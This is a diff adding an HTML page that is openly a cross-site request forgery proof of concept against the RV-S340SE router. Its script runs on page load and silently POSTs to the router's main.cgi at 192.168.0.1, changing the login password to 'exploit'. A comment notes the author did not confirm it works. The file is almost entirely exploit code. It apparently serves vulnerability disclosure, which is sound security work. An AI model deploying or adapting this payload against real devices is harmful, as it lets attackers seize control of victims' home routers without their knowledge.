@@ -1,0 +1,27 @@
+﻿<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <title>RV-S340SE CSRF(change password) PoC</title>
+  <script>
+    // XMLHttpRequest edition on http://d.hatena.ne.jp/kaito834/20141120
+    // Note: I didn't confirm that this PoC was successful against RV-S340SE
+    function exploit(){
+      var xhr = new XMLHttpRequest();
+      // http://stackoverflow.com/questions/75980/when-are-you-supposed-to-use-escape-instead-of-encodeuri-encodeuricomponent
+      var postdata = 'mbg_webname=loginpass_user_input&config_no=1&loginpass_user_pass=exploit&loginpass_user_passcfm=exploit&mbg_set=' + encodeURIComponent('設定');
+      xhr.open('POST', 'http://192.168.0.1/cgi-bin/main.cgi', 'true');
+      xhr.onreadystatechange = function(){};
+      xhr.send(postdata);
+    }
+
+    // Based on http://qiita.com/gaogao_9/items/ec2b867d6941173fd0b1
+    document.addEventListener("DOMContentLoaded", function(){
+      exploit();
+      console.log("Exploited")
+    }, false)
+  </script>
+</head>
+<body>
+  <p>This is PoC for RV-S340SE CSRF to change password.</p>
+</body>
+</html>
